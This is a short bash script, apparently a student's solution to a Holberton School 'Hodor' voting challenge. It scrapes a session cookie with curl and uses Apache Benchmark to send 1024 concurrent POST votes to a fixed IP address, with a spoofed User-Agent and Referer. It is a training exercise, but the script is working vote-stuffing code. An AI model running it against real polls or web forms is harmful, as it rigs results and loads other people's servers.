#!/bin/bash

# ===---Hodor Level 2-------------------------------------------------------------===
#  Solution in Shell Script for Hodor Project Level 2, by Julien Barbier
#  Using Apache HTTP server benchmarking tool.
#  More info: http://httpd.apache.org/docs/2.4/programs/ab.html
#
#  by Alexandro de Oliveira, for Holberton School.
# ===-----------------------------------------------------------------------------===

# Defining parameters/variables:
URL=http://173.246.108.142/level2.php		# URL
TYPE='application/x-www-form-urlencoded'	# Content Type.
REQ=$((1 << 10))				# Total number of requests.
FILE=body-content				# Name of the file with the encode string to be submitted.
CONC=50						# Number of concurrent requests.
VERB=1						# Verbosity level(from 0 to 4)
HEADER='User-Agent: Windows NT 100000.0.0.0.1 havk64 - Using Apache Benchmark utility'
REF="Referer: $URL"

# Getting, parsing, extracting the cookie value and assigning it to a variable:
COOKIE=$(curl -X HEAD -s -c - http://173.246.108.142/level1.php | grep HoldTheDoor | awk '{ print $7 }')

# Writing the cookie for the file that Apache needs:
echo -n "id=23&holdthedoor=submit&key=$COOKIE" > body-content

# Using Apache Benchmark to do the post requests:
ab -n $REQ -c $CONC -T $TYPE -H "$HEADER" -H "$REF" -p $FILE -C "HoldTheDoor=$COOKIE" -v $VERB $URL

